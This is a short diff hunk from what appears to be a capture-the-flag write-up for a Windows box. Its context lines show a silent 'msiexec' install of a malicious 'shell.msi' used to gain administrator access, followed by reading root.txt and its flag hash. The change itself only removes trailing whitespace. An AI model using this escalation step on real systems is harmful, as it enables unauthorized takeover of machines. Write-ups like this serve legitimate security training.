@@ -392,12 +392,12 @@ PS C:\Users\Phoebe\Desktop> msiexec /quiet /qn /i shell.msi
 ```powershell
 LOVE\Phoebe> ls
 Directory: C:\Users\Administrator\Desktop
-                                                                                                                                                                                             
-                                                                                                                                                                                             
+
+
 Mode                 LastWriteTime         Length Name                                                                                                                                       
 ----                 -------------         ------ ----                                                                                                                                       
 -ar---        12/27/2022  12:48 PM             34 root.txt                                                                                                                                   
-                                                                                                                                                                                             
+
 LOVE\Phoebe> type root.txt
 9e75984b941942555488b44e7f53ce31
 ```
